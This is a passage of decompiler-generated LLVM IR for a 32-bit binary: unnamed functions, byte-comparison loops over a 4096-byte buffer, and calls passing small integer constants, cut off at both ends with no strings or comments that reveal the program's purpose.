  %v1_804eb5c = phi i32 [ %v1_804eb59, %dec_label_pc_804eab6 ], [ %v0_804ec67, %dec_label_pc_804ec67 ], [ %v0_804ec67, %dec_label_pc_804ec70.backedge ], [ %v0_804ec67, %dec_label_pc_804ec58 ]
  %v0_804eb5c = phi i32 [ %v0_804eb5c.pre, %dec_label_pc_804eab6 ], [ %v0_804eb5c54, %dec_label_pc_804ec67 ], [ %v6_804ec7e, %dec_label_pc_804ec70.backedge ], [ %v0_804eb5c54, %dec_label_pc_804ec58 ]
  %v2_804eb5c = add i32 %v1_804eb5c, -4
  %v3_804eb5c = inttoptr i32 %v2_804eb5c to i32*
  store i32 %v0_804eb5c, i32* %v3_804eb5c, align 4
  %v1_804eb5d = add i32 %v1_804eb5c, -8
  %v2_804eb5d = inttoptr i32 %v1_804eb5d to i32*
  store i32 4096, i32* %v2_804eb5d, align 4
  %v1_804eb62 = add i32 %v1_804eb5c, 56
  store i32 %v1_804eb62, i32* %eax.global-to-local, align 4
  %v2_804eb66 = add i32 %v1_804eb5c, -12
  %v3_804eb66 = inttoptr i32 %v2_804eb66 to i32*
  store i32 %v1_804eb62, i32* %v3_804eb66, align 4
  %v1_804eb67 = add i32 %v1_804eb5c, 40
  %v2_804eb67 = inttoptr i32 %v1_804eb67 to i32*
  %v3_804eb67 = load i32, i32* %v2_804eb67, align 4
  store i32 %v3_804eb67, i32* %eax.global-to-local, align 4
  %v2_804eb6b = add i32 %v1_804eb5c, -16
  %v3_804eb6b = inttoptr i32 %v2_804eb6b to i32*
  store i32 %v3_804eb67, i32* %v3_804eb6b, align 4
  %v5_804eb6c = call i32 @function_8052d5c(i32 0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804eb6c, i32* %eax.global-to-local, align 4
  %v0_804eb71 = load i32, i32* @esp, align 4
  store i32 %v5_804eb6c, i32* @ebx, align 4
  %tmp116 = icmp slt i32 %v5_804eb6c, 1
  br i1 %tmp116, label %dec_label_pc_804ed67, label %dec_label_pc_804eb7e

dec_label_pc_804eb7e:                             ; preds = %dec_label_pc_804eb5c
  %v1_804eb71 = add i32 %v0_804eb71, 16
  %v1_804eb7e = add i32 %v0_804eb71, 8436
  %v2_804eb7e = inttoptr i32 %v1_804eb7e to i32*
  %v3_804eb7e = load i32, i32* %v2_804eb7e, align 4
  store i32 %v3_804eb7e, i32* %eax.global-to-local, align 4
  %v2_804eb85 = inttoptr i32 %v1_804eb71 to i32*
  store i32 %v3_804eb7e, i32* %v2_804eb85, align 4
  %v0_804eb88 = load i32, i32* @ebx, align 4
  %v1_804eb88 = load i32, i32* %eax.global-to-local, align 4
  %v2_804eb88 = sub i32 %v0_804eb88, %v1_804eb88
  %v8_804eb88 = xor i32 %v1_804eb88, %v0_804eb88
  %v9_804eb88 = xor i32 %v2_804eb88, %v0_804eb88
  %v10_804eb88 = and i32 %v9_804eb88, %v8_804eb88
  %v11_804eb88 = icmp slt i32 %v10_804eb88, 0
  %v13_804eb88 = icmp slt i32 %v2_804eb88, 0
  %v2_804eb8a = icmp eq i1 %v13_804eb88, %v11_804eb88
  br i1 %v2_804eb8a, label %dec_label_pc_804eb8c, label %dec_label_pc_804eb7e.dec_label_pc_804ebb8_crit_edge

dec_label_pc_804eb7e.dec_label_pc_804ebb8_crit_edge: ; preds = %dec_label_pc_804eb7e
  %v0_804ebb8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ebb8

dec_label_pc_804eb8c:                             ; preds = %dec_label_pc_804eb7e
  %v0_804eb91 = load i32, i32* @esp, align 4
  %v10_804eb95 = icmp eq i32 %v0_804eb88, 0
  br i1 %v10_804eb95, label %dec_label_pc_804ebb8, label %dec_label_pc_804eba0.preheader

dec_label_pc_804eba0.preheader:                   ; preds = %dec_label_pc_804eb8c
  %v1_804eb91 = add i32 %v0_804eb91, 56
  %v1_804eba0 = add i32 %v0_804eb91, 36
  %v2_804eba0 = inttoptr i32 %v1_804eba0 to i32*
  %v1_804ec91 = inttoptr i32 %v0_804eb91 to i32*
  br label %dec_label_pc_804eba0

dec_label_pc_804eba0:                             ; preds = %dec_label_pc_804eba0.preheader, %dec_label_pc_804ebb1
  %v0_804ebb1.in = phi i32 [ %v0_804ebb1, %dec_label_pc_804ebb1 ], [ %v0_804eb88, %dec_label_pc_804eba0.preheader ]
  %v0_804ec90 = phi i32 [ %v3_804eba663, %dec_label_pc_804ebb1 ], [ 0, %dec_label_pc_804eba0.preheader ]
  %v4_804eba4 = phi i32 [ %v6_804eba4, %dec_label_pc_804ebb1 ], [ %v1_804eb88, %dec_label_pc_804eba0.preheader ]
  %v0_804ebb2 = phi i32 [ %v1_804ebb2, %dec_label_pc_804ebb1 ], [ %v1_804eb91, %dec_label_pc_804eba0.preheader ]
  %v0_804ebb1 = add i32 %v0_804ebb1.in, -1
  %v3_804eba0 = load i32, i32* %v2_804eba0, align 4
  store i32 %v3_804eba0, i32* @edi, align 4
  %v1_804eba4 = inttoptr i32 %v0_804ebb2 to i8*
  %v2_804eba4 = load i8, i8* %v1_804eba4, align 1
  %v3_804eba4 = zext i8 %v2_804eba4 to i32
  %v5_804eba4 = and i32 %v4_804eba4, -256
  %v6_804eba4 = or i32 %v3_804eba4, %v5_804eba4
  store i32 %v6_804eba4, i32* %eax.global-to-local, align 4
  %v4_804eba6 = add i32 %v3_804eba0, %v0_804ec90
  %v5_804eba6 = inttoptr i32 %v4_804eba6 to i8*
  %v6_804eba6 = load i8, i8* %v5_804eba6, align 1
  %v17_804eba6 = icmp eq i8 %v2_804eba4, %v6_804eba6
  br i1 %v17_804eba6, label %dec_label_pc_804ec90, label %dec_label_pc_804ebaf

dec_label_pc_804ebaf:                             ; preds = %dec_label_pc_804eba0
  br label %dec_label_pc_804ebb1

dec_label_pc_804ebb1:                             ; preds = %dec_label_pc_804ec90, %dec_label_pc_804ebaf
  %v3_804eba663 = phi i32 [ %v1_804ec90, %dec_label_pc_804ec90 ], [ 0, %dec_label_pc_804ebaf ]
  %v1_804ebb2 = add i32 %v0_804ebb2, 1
  %v10_804ebb3 = icmp eq i32 %v0_804ebb1, 0
  %v1_804ebb6 = icmp eq i1 %v10_804ebb3, false
  br i1 %v1_804ebb6, label %dec_label_pc_804eba0, label %dec_label_pc_804ebb8

dec_label_pc_804ebb8:                             ; preds = %dec_label_pc_804ebb1, %dec_label_pc_804eb7e.dec_label_pc_804ebb8_crit_edge, %dec_label_pc_804eb8c
  %v0_804ebb8 = phi i32 [ %v0_804ebb8.pre, %dec_label_pc_804eb7e.dec_label_pc_804ebb8_crit_edge ], [ %v0_804eb91, %dec_label_pc_804eb8c ], [ %v0_804eb91, %dec_label_pc_804ebb1 ]
  %v1_804ebb8 = add i32 %v0_804ebb8, 8416
  %v2_804ebb8 = inttoptr i32 %v1_804ebb8 to i32*
  %v3_804ebb8 = load i32, i32* %v2_804ebb8, align 4
  store i32 %v3_804ebb8, i32* %eax.global-to-local, align 4
  %v2_804ebbf = inttoptr i32 %v0_804ebb8 to i32*
  store i32 %v3_804ebb8, i32* %v2_804ebbf, align 4
  %v0_804ebc2 = load i32, i32* @ebx, align 4
  %v1_804ebc2 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ebc2 = sub i32 %v0_804ebc2, %v1_804ebc2
  %v8_804ebc2 = xor i32 %v1_804ebc2, %v0_804ebc2
  %v9_804ebc2 = xor i32 %v2_804ebc2, %v0_804ebc2
  %v10_804ebc2 = and i32 %v9_804ebc2, %v8_804ebc2
  %v11_804ebc2 = icmp slt i32 %v10_804ebc2, 0
  %v13_804ebc2 = icmp slt i32 %v2_804ebc2, 0
  %v2_804ebc4 = icmp eq i1 %v13_804ebc2, %v11_804ebc2
  br i1 %v2_804ebc4, label %dec_label_pc_804ebc6, label %dec_label_pc_804ebb8.dec_label_pc_804ebec_crit_edge

dec_label_pc_804ebb8.dec_label_pc_804ebec_crit_edge: ; preds = %dec_label_pc_804ebb8
  %v0_804ebec.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ebec

dec_label_pc_804ebc6:                             ; preds = %dec_label_pc_804ebb8
  %v0_804ebcb = load i32, i32* @esp, align 4
  %v10_804ebcf = icmp eq i32 %v0_804ebc2, 0
  br i1 %v10_804ebcf, label %dec_label_pc_804ebec, label %dec_label_pc_804ebd4.preheader

dec_label_pc_804ebd4.preheader:                   ; preds = %dec_label_pc_804ebc6
  %v1_804ebcb = add i32 %v0_804ebcb, 56
  %v1_804ebd4 = add i32 %v0_804ebcb, 32
  %v2_804ebd4 = inttoptr i32 %v1_804ebd4 to i32*
  %v1_804ed29 = inttoptr i32 %v0_804ebcb to i32*
  br label %dec_label_pc_804ebd4

dec_label_pc_804ebd4:                             ; preds = %dec_label_pc_804ebd4.preheader, %dec_label_pc_804ebe6
  %v0_804ebe6.in = phi i32 [ %v0_804ebe6, %dec_label_pc_804ebe6 ], [ %v0_804ebc2, %dec_label_pc_804ebd4.preheader ]
  %v0_804ed28 = phi i32 [ %v3_804ebda71, %dec_label_pc_804ebe6 ], [ 0, %dec_label_pc_804ebd4.preheader ]
  %v4_804ebd8 = phi i32 [ %v6_804ebd8, %dec_label_pc_804ebe6 ], [ %v1_804ebc2, %dec_label_pc_804ebd4.preheader ]
  %v0_804ed32 = phi i32 [ %v1_804ebe5, %dec_label_pc_804ebe6 ], [ %v1_804ebcb, %dec_label_pc_804ebd4.preheader ]
  %v0_804ebe6 = add i32 %v0_804ebe6.in, -1
  %v3_804ebd4 = load i32, i32* %v2_804ebd4, align 4
  store i32 %v3_804ebd4, i32* @edi, align 4
  %v1_804ebd8 = inttoptr i32 %v0_804ed32 to i8*
  %v2_804ebd8 = load i8, i8* %v1_804ebd8, align 1
  %v3_804ebd8 = zext i8 %v2_804ebd8 to i32
  %v5_804ebd8 = and i32 %v4_804ebd8, -256
  %v6_804ebd8 = or i32 %v3_804ebd8, %v5_804ebd8
  store i32 %v6_804ebd8, i32* %eax.global-to-local, align 4
  %v4_804ebda = add i32 %v3_804ebd4, %v0_804ed28
  %v5_804ebda = inttoptr i32 %v4_804ebda to i8*
  %v6_804ebda = load i8, i8* %v5_804ebda, align 1
  %v17_804ebda = icmp eq i8 %v2_804ebd8, %v6_804ebda
  br i1 %v17_804ebda, label %dec_label_pc_804ed28, label %dec_label_pc_804ebe3

dec_label_pc_804ebe3:                             ; preds = %dec_label_pc_804ebd4
  br label %dec_label_pc_804ebe6

dec_label_pc_804ebe6:                             ; preds = %dec_label_pc_804ed28, %dec_label_pc_804ebe3
  %v3_804ebda71 = phi i32 [ 0, %dec_label_pc_804ebe3 ], [ %v1_804ed28, %dec_label_pc_804ed28 ]
  %v1_804ebe5 = add i32 %v0_804ed32, 1
  %v10_804ebe7 = icmp eq i32 %v0_804ebe6, 0
  %v1_804ebea = icmp eq i1 %v10_804ebe7, false
  br i1 %v1_804ebea, label %dec_label_pc_804ebd4, label %dec_label_pc_804ebec

dec_label_pc_804ebec:                             ; preds = %dec_label_pc_804ebe6, %dec_label_pc_804ebb8.dec_label_pc_804ebec_crit_edge, %dec_label_pc_804ebc6
  %v0_804ebec = phi i32 [ %v0_804ebec.pre, %dec_label_pc_804ebb8.dec_label_pc_804ebec_crit_edge ], [ %v0_804ebcb, %dec_label_pc_804ebc6 ], [ %v0_804ebcb, %dec_label_pc_804ebe6 ]
  %v1_804ebec = add i32 %v0_804ebec, 8412
  %v2_804ebec = inttoptr i32 %v1_804ebec to i32*
  %v3_804ebec = load i32, i32* %v2_804ebec, align 4
  store i32 %v3_804ebec, i32* %eax.global-to-local, align 4
  %v2_804ebf3 = inttoptr i32 %v0_804ebec to i32*
  store i32 %v3_804ebec, i32* %v2_804ebf3, align 4
  %v0_804ebf6 = load i32, i32* @ebx, align 4
  %v1_804ebf6 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ebf6 = sub i32 %v0_804ebf6, %v1_804ebf6
  %v8_804ebf6 = xor i32 %v1_804ebf6, %v0_804ebf6
  %v9_804ebf6 = xor i32 %v2_804ebf6, %v0_804ebf6
  %v10_804ebf6 = and i32 %v9_804ebf6, %v8_804ebf6
  %v11_804ebf6 = icmp slt i32 %v10_804ebf6, 0
  %v13_804ebf6 = icmp slt i32 %v2_804ebf6, 0
  %v2_804ebf8 = icmp eq i1 %v13_804ebf6, %v11_804ebf6
  br i1 %v2_804ebf8, label %dec_label_pc_804ebfa, label %dec_label_pc_804ebec.dec_label_pc_804ec20_crit_edge

dec_label_pc_804ebec.dec_label_pc_804ec20_crit_edge: ; preds = %dec_label_pc_804ebec
  %v0_804ec20.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ec20

dec_label_pc_804ebfa:                             ; preds = %dec_label_pc_804ebec
  %v0_804ebff = load i32, i32* @esp, align 4
  %v10_804ec03 = icmp eq i32 %v0_804ebf6, 0
  br i1 %v10_804ec03, label %dec_label_pc_804ec20, label %dec_label_pc_804ec08.preheader

dec_label_pc_804ec08.preheader:                   ; preds = %dec_label_pc_804ebfa
  %v1_804ebff = add i32 %v0_804ebff, 56
  %v1_804ec08 = add i32 %v0_804ebff, 28
  %v2_804ec08 = inttoptr i32 %v1_804ec08 to i32*
  %v1_804ed39 = inttoptr i32 %v0_804ebff to i32*
  br label %dec_label_pc_804ec08

dec_label_pc_804ec08:                             ; preds = %dec_label_pc_804ec08.preheader, %dec_label_pc_804ec1a
  %v0_804ec1a.in = phi i32 [ %v0_804ec1a, %dec_label_pc_804ec1a ], [ %v0_804ebf6, %dec_label_pc_804ec08.preheader ]
  %v0_804ed38 = phi i32 [ %v3_804ec0e79, %dec_label_pc_804ec1a ], [ 0, %dec_label_pc_804ec08.preheader ]
  %v4_804ec0c = phi i32 [ %v6_804ec0c, %dec_label_pc_804ec1a ], [ %v1_804ebf6, %dec_label_pc_804ec08.preheader ]
  %v0_804ed42 = phi i32 [ %v1_804ec19, %dec_label_pc_804ec1a ], [ %v1_804ebff, %dec_label_pc_804ec08.preheader ]
  %v0_804ec1a = add i32 %v0_804ec1a.in, -1
  %v3_804ec08 = load i32, i32* %v2_804ec08, align 4
  store i32 %v3_804ec08, i32* @edi, align 4
  %v1_804ec0c = inttoptr i32 %v0_804ed42 to i8*
  %v2_804ec0c = load i8, i8* %v1_804ec0c, align 1
  %v3_804ec0c = zext i8 %v2_804ec0c to i32
  %v5_804ec0c = and i32 %v4_804ec0c, -256
  %v6_804ec0c = or i32 %v3_804ec0c, %v5_804ec0c
  store i32 %v6_804ec0c, i32* %eax.global-to-local, align 4
  %v4_804ec0e = add i32 %v3_804ec08, %v0_804ed38
  %v5_804ec0e = inttoptr i32 %v4_804ec0e to i8*
  %v6_804ec0e = load i8, i8* %v5_804ec0e, align 1
  %v17_804ec0e = icmp eq i8 %v2_804ec0c, %v6_804ec0e
  br i1 %v17_804ec0e, label %dec_label_pc_804ed38, label %dec_label_pc_804ec17

dec_label_pc_804ec17:                             ; preds = %dec_label_pc_804ec08
  br label %dec_label_pc_804ec1a

dec_label_pc_804ec1a:                             ; preds = %dec_label_pc_804ed38, %dec_label_pc_804ec17
  %v3_804ec0e79 = phi i32 [ 0, %dec_label_pc_804ec17 ], [ %v1_804ed38, %dec_label_pc_804ed38 ]
  %v1_804ec19 = add i32 %v0_804ed42, 1
  %v10_804ec1b = icmp eq i32 %v0_804ec1a, 0
  %v1_804ec1e = icmp eq i1 %v10_804ec1b, false
  br i1 %v1_804ec1e, label %dec_label_pc_804ec08, label %dec_label_pc_804ec20

dec_label_pc_804ec20:                             ; preds = %dec_label_pc_804ec1a, %dec_label_pc_804ebec.dec_label_pc_804ec20_crit_edge, %dec_label_pc_804ebfa
  %v0_804ec20 = phi i32 [ %v0_804ec20.pre, %dec_label_pc_804ebec.dec_label_pc_804ec20_crit_edge ], [ %v0_804ebff, %dec_label_pc_804ebfa ], [ %v0_804ebff, %dec_label_pc_804ec1a ]
  %v1_804ec20 = add i32 %v0_804ec20, 8424
  %v2_804ec20 = inttoptr i32 %v1_804ec20 to i32*
  %v3_804ec20 = load i32, i32* %v2_804ec20, align 4
  store i32 %v3_804ec20, i32* %eax.global-to-local, align 4
  %v2_804ec27 = inttoptr i32 %v0_804ec20 to i32*
  store i32 %v3_804ec20, i32* %v2_804ec27, align 4
  %v0_804ec2a = load i32, i32* @ebx, align 4
  %v1_804ec2a = load i32, i32* %eax.global-to-local, align 4
  %v2_804ec2a = sub i32 %v0_804ec2a, %v1_804ec2a
  %v8_804ec2a = xor i32 %v1_804ec2a, %v0_804ec2a
  %v9_804ec2a = xor i32 %v2_804ec2a, %v0_804ec2a
  %v10_804ec2a = and i32 %v9_804ec2a, %v8_804ec2a
  %v11_804ec2a = icmp slt i32 %v10_804ec2a, 0
  %v13_804ec2a = icmp slt i32 %v2_804ec2a, 0
  %v2_804ec2c = icmp eq i1 %v13_804ec2a, %v11_804ec2a
  br i1 %v2_804ec2c, label %dec_label_pc_804ec2e, label %dec_label_pc_804ec20.dec_label_pc_804ec58_crit_edge

dec_label_pc_804ec20.dec_label_pc_804ec58_crit_edge: ; preds = %dec_label_pc_804ec20
  %v0_804ec58.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ec58

dec_label_pc_804ec2e:                             ; preds = %dec_label_pc_804ec20
  %v0_804ec33 = load i32, i32* @esp, align 4
  %v10_804ec37 = icmp eq i32 %v0_804ec2a, 0
  br i1 %v10_804ec37, label %dec_label_pc_804ec58, label %dec_label_pc_804ec40.preheader

dec_label_pc_804ec40.preheader:                   ; preds = %dec_label_pc_804ec2e
  %v1_804ec33 = add i32 %v0_804ec33, 56
  %v1_804ec40 = add i32 %v0_804ec33, 24
  %v2_804ec40 = inttoptr i32 %v1_804ec40 to i32*
  %v1_804ed49 = inttoptr i32 %v0_804ec33 to i32*
  br label %dec_label_pc_804ec40

dec_label_pc_804ec40:                             ; preds = %dec_label_pc_804ec40.preheader, %dec_label_pc_804ec52
  %v0_804ec52.in = phi i32 [ %v0_804ec52, %dec_label_pc_804ec52 ], [ %v0_804ec2a, %dec_label_pc_804ec40.preheader ]
  %v0_804ed48 = phi i32 [ %v3_804ec4687, %dec_label_pc_804ec52 ], [ 0, %dec_label_pc_804ec40.preheader ]
  %v4_804ec44 = phi i32 [ %v6_804ec44, %dec_label_pc_804ec52 ], [ %v1_804ec2a, %dec_label_pc_804ec40.preheader ]
  %v0_804ed52 = phi i32 [ %v1_804ec51, %dec_label_pc_804ec52 ], [ %v1_804ec33, %dec_label_pc_804ec40.preheader ]
  %v0_804ec52 = add i32 %v0_804ec52.in, -1
  %v3_804ec40 = load i32, i32* %v2_804ec40, align 4
  store i32 %v3_804ec40, i32* @edi, align 4
  %v1_804ec44 = inttoptr i32 %v0_804ed52 to i8*
  %v2_804ec44 = load i8, i8* %v1_804ec44, align 1
  %v3_804ec44 = zext i8 %v2_804ec44 to i32
  %v5_804ec44 = and i32 %v4_804ec44, -256
  %v6_804ec44 = or i32 %v3_804ec44, %v5_804ec44
  store i32 %v6_804ec44, i32* %eax.global-to-local, align 4
  %v4_804ec46 = add i32 %v3_804ec40, %v0_804ed48
  %v5_804ec46 = inttoptr i32 %v4_804ec46 to i8*
  %v6_804ec46 = load i8, i8* %v5_804ec46, align 1
  %v17_804ec46 = icmp eq i8 %v2_804ec44, %v6_804ec46
  br i1 %v17_804ec46, label %dec_label_pc_804ed48, label %dec_label_pc_804ec4f

dec_label_pc_804ec4f:                             ; preds = %dec_label_pc_804ec40
  br label %dec_label_pc_804ec52

dec_label_pc_804ec52:                             ; preds = %dec_label_pc_804ed48, %dec_label_pc_804ec4f
  %v3_804ec4687 = phi i32 [ 0, %dec_label_pc_804ec4f ], [ %v1_804ed48, %dec_label_pc_804ed48 ]
  %v1_804ec51 = add i32 %v0_804ed52, 1
  %v10_804ec53 = icmp eq i32 %v0_804ec52, 0
  %v1_804ec56 = icmp eq i1 %v10_804ec53, false
  br i1 %v1_804ec56, label %dec_label_pc_804ec40, label %dec_label_pc_804ec58

dec_label_pc_804ec58:                             ; preds = %dec_label_pc_804ec52, %dec_label_pc_804ec20.dec_label_pc_804ec58_crit_edge, %dec_label_pc_804ec2e
  %v0_804ec67 = phi i32 [ %v0_804ec58.pre, %dec_label_pc_804ec20.dec_label_pc_804ec58_crit_edge ], [ %v0_804ec33, %dec_label_pc_804ec2e ], [ %v0_804ec33, %dec_label_pc_804ec52 ]
  %v0_804eb5c54 = phi i32 [ %v1_804ec2a, %dec_label_pc_804ec20.dec_label_pc_804ec58_crit_edge ], [ %v1_804ec2a, %dec_label_pc_804ec2e ], [ %v6_804ec44, %dec_label_pc_804ec52 ]
  %v1_804ec58 = add i32 %v0_804ec67, 8408
  %v2_804ec58 = inttoptr i32 %v1_804ec58 to i32*
  %v3_804ec58 = load i32, i32* %v2_804ec58, align 4
  %v2_804ec5f = sub i32 %v0_804ec2a, %v3_804ec58
  %v8_804ec5f = xor i32 %v3_804ec58, %v0_804ec2a
  %v9_804ec5f = xor i32 %v2_804ec5f, %v0_804ec2a
  %v10_804ec5f = and i32 %v9_804ec5f, %v8_804ec5f
  %v11_804ec5f = icmp slt i32 %v10_804ec5f, 0
  %v13_804ec5f = icmp slt i32 %v2_804ec5f, 0
  %v2_804ec61 = icmp eq i1 %v13_804ec5f, %v11_804ec5f
  br i1 %v2_804ec61, label %dec_label_pc_804ec67, label %dec_label_pc_804eb5c

dec_label_pc_804ec67:                             ; preds = %dec_label_pc_804ec58
  %v1_804ec70128 = add i32 %v0_804ec2a, -1
  store i32 %v1_804ec70128, i32* @ebx, align 4
  %v10_804ec71129 = icmp eq i32 %v0_804ec2a, 0
  br i1 %v10_804ec71129, label %dec_label_pc_804eb5c, label %dec_label_pc_804ec7a.lr.ph

dec_label_pc_804ec7a.lr.ph:                       ; preds = %dec_label_pc_804ec67
  %v1_804ec67 = add i32 %v0_804ec67, 56
  %v1_804ec7a = add i32 %v0_804ec67, 20
  %v2_804ec7a = inttoptr i32 %v1_804ec7a to i32*
  br label %dec_label_pc_804ec7a

dec_label_pc_804ec7a:                             ; preds = %dec_label_pc_804ec7a.lr.ph, %dec_label_pc_804ec70.backedge
  %v1_804ec70133 = phi i32 [ %v1_804ec70128, %dec_label_pc_804ec7a.lr.ph ], [ %v1_804ec70, %dec_label_pc_804ec70.backedge ]
  %v4_804ec7e132 = phi i32 [ %v0_804eb5c54, %dec_label_pc_804ec7a.lr.ph ], [ %v6_804ec7e, %dec_label_pc_804ec70.backedge ]
  %v0_804ed61131 = phi i32 [ %v1_804ec67, %dec_label_pc_804ec7a.lr.ph ], [ %storemerge33.in, %dec_label_pc_804ec70.backedge ]
  %v0_804ed58130 = phi i32 [ 0, %dec_label_pc_804ec7a.lr.ph ], [ %v3_804ec8093, %dec_label_pc_804ec70.backedge ]
  %v3_804ec7a = load i32, i32* %v2_804ec7a, align 4
  store i32 %v3_804ec7a, i32* @edi, align 4
  %v1_804ec7e = inttoptr i32 %v0_804ed61131 to i8*
  %v2_804ec7e = load i8, i8* %v1_804ec7e, align 1
  %v3_804ec7e = zext i8 %v2_804ec7e to i32
  %v5_804ec7e = and i32 %v4_804ec7e132, -256
  %v6_804ec7e = or i32 %v3_804ec7e, %v5_804ec7e
  store i32 %v6_804ec7e, i32* %eax.global-to-local, align 4
  %v4_804ec80 = add i32 %v3_804ec7a, %v0_804ed58130
  %v5_804ec80 = inttoptr i32 %v4_804ec80 to i8*
  %v6_804ec80 = load i8, i8* %v5_804ec80, align 1
  %v17_804ec80 = icmp eq i8 %v2_804ec7e, %v6_804ec80
  br i1 %v17_804ec80, label %dec_label_pc_804ed58, label %dec_label_pc_804ec89

dec_label_pc_804ec89:                             ; preds = %dec_label_pc_804ec7a
  br label %dec_label_pc_804ec70.backedge

dec_label_pc_804ec90:                             ; preds = %dec_label_pc_804eba0
  %v1_804ec90 = add i32 %v0_804ec90, 1
  %v2_804ec91 = load i32, i32* %v1_804ec91, align 4
  %v14_804ec91 = icmp eq i32 %v2_804ec91, %v1_804ec90
  %v1_804ec94 = icmp eq i1 %v14_804ec91, false
  br i1 %v1_804ec94, label %dec_label_pc_804ebb1, label %dec_label_pc_804ec9a

dec_label_pc_804ec9a:                             ; preds = %dec_label_pc_804ec90, %dec_label_pc_804ed28, %dec_label_pc_804ed38, %dec_label_pc_804ed48, %dec_label_pc_804ed58
  %v0_804ec9a = phi i32 [ %v0_804ec67, %dec_label_pc_804ed58 ], [ %v0_804ec33, %dec_label_pc_804ed48 ], [ %v0_804ebff, %dec_label_pc_804ed38 ], [ %v0_804ebcb, %dec_label_pc_804ed28 ], [ %v0_804eb91, %dec_label_pc_804ec90 ]
  %v1_804ec9d = add i32 %v0_804ec9a, -16
  %v2_804ec9d = inttoptr i32 %v1_804ec9d to i32*
  store i32 12, i32* %v2_804ec9d, align 4
  %v2_804ec9f = call i32 @function_8051c50(i8 0)
  store i32 %v2_804ec9f, i32* %eax.global-to-local, align 4
  %v0_804eca4 = load i32, i32* @esp, align 4
  %v1_804eca4 = inttoptr i32 %v0_804eca4 to i32*
  store i32 13, i32* %v1_804eca4, align 4
  %v2_804ecab = call i32 @function_8051c50(i8 0)
  store i32 %v2_804ecab, i32* %eax.global-to-local, align 4
  %v0_804ecb0 = load i32, i32* @esp, align 4
  %v1_804ecb0 = inttoptr i32 %v0_804ecb0 to i32*
  store i32 14, i32* %v1_804ecb0, align 4
  %v2_804ecb7 = call i32 @function_8051c50(i8 0)
  store i32 %v2_804ecb7, i32* %eax.global-to-local, align 4
  %v0_804ecbc = load i32, i32* @esp, align 4
  %v1_804ecbc = inttoptr i32 %v0_804ecbc to i32*
  store i32 15, i32* %v1_804ecbc, align 4
  %v2_804ecc3 = call i32 @function_8051c50(i8 0)
  store i32 %v2_804ecc3, i32* %eax.global-to-local, align 4
  %v0_804ecc8 = load i32, i32* @esp, align 4
  %v1_804ecc8 = inttoptr i32 %v0_804ecc8 to i32*
  store i32 16, i32* %v1_804ecc8, align 4
  %v2_804eccf = call i32 @function_8051c50(i8 0)
  store i32 %v2_804eccf, i32* %eax.global-to-local, align 4
  %v0_804ecd4 = load i32, i32* @esp, align 4
  %v1_804ecd4 = inttoptr i32 %v0_804ecd4 to i32*
  %v2_804ecd4 = load i32, i32* %v1_804ecd4, align 4
  store i32 %v2_804ecd4, i32* %eax.global-to-local, align 4
  %v1_804ecd5 = add i32 %v0_804ecd4, 56
  %v2_804ecd5 = inttoptr i32 %v1_804ecd5 to i32*
  %v3_804ecd5 = load i32, i32* %v2_804ecd5, align 4
  store i32 %v3_804ecd5, i32* @edi, align 4
  store i32 %v3_804ecd5, i32* %v1_804ecd4, align 4
  %v1_804ecda = call i32 @function_8052bc1(i32 0)
  store i32 %v1_804ecda, i32* %eax.global-to-local, align 4
  %v0_804ecdf = load i32, i32* @esp, align 4
  %v1_804ecdf = inttoptr i32 %v0_804ecdf to i32*
  %v2_804ecdf = load i32, i32* %v1_804ecdf, align 4
  store i32 %v2_804ecdf, i32* @ebx, align 4
  %v3_804ecdf = add i32 %v0_804ecdf, 4
  %v1_804ece0 = inttoptr i32 %v3_804ecdf to i32*
  store i32 9, i32* %v1_804ece0, align 4
  %v0_804ece3 = load i32, i32* @ebp, align 4
  store i32 %v0_804ece3, i32* %v1_804ecdf, align 4
  %v4_804ece4 = call i32 @function_8052ca0(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804ece4, i32* @eax, align 4
  %v0_804ece9 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ecec

dec_label_pc_804ecec:                             ; preds = %dec_label_pc_804ea97, %dec_label_pc_804ed67, %dec_label_pc_804ec9a
  %v1_804ecec.in = phi i32 [ %v0_804eaac, %dec_label_pc_804ea97 ], [ %v0_804edac, %dec_label_pc_804ed67 ], [ %v0_804ece9, %dec_label_pc_804ec9a ]
  %v0_804ecec = load i32, i32* @ecx, align 4
  %v2_804ecec = add i32 %v1_804ecec.in, 12
  %v3_804ecec = inttoptr i32 %v2_804ecec to i32*
  store i32 %v0_804ecec, i32* %v3_804ecec, align 4
  %v0_804eced = load i32, i32* @ecx, align 4
  %v2_804eced = add i32 %v1_804ecec.in, 8
  %v3_804eced = inttoptr i32 %v2_804eced to i32*
  store i32 %v0_804eced, i32* %v3_804eced, align 4
  %v1_804ecee = add i32 %v1_804ecec.in, 4
  %v2_804ecee = inttoptr i32 %v1_804ecee to i32*
  store i32 64, i32* %v2_804ecee, align 4
  %v0_804ecf0 = load i32, i32* @ebp, align 4
  store i32 %v0_804ecf0, i32* @esi, align 4
  %v1_804ecf2 = add i32 %v1_804ecec.in, 8328
  store i32 %v1_804ecf2, i32* @edi, align 4
  %v3_804ecf9 = inttoptr i32 %v1_804ecec.in to i32*
  store i32 %v1_804ecf2, i32* %v3_804ecf9, align 4
  %v2_804ecfa = call i32 @function_80526b0(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804ecfa, i32* %eax.global-to-local, align 4
  %v0_804ecff = load i32, i32* @esp, align 4
  %v1_804ecff = inttoptr i32 %v0_804ecff to i32*
  %v2_804ecff = load i32, i32* %v1_804ecff, align 4
  store i32 %v2_804ecff, i32* %eax.global-to-local, align 4
  %v3_804ecff = add i32 %v0_804ecff, 4
  %v1_804ed00 = inttoptr i32 %v3_804ecff to i32*
  store i32 64, i32* %v1_804ed00, align 4
  %v1_804ed03 = add i32 %v0_804ecff, 8264
  store i32 %v1_804ed03, i32* @eax, align 4
  store i32 %v1_804ed03, i32* %v1_804ecff, align 4
  %v2_804ed0b = call i32 @function_80526b0(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804ed0b, i32* %eax.global-to-local, align 4
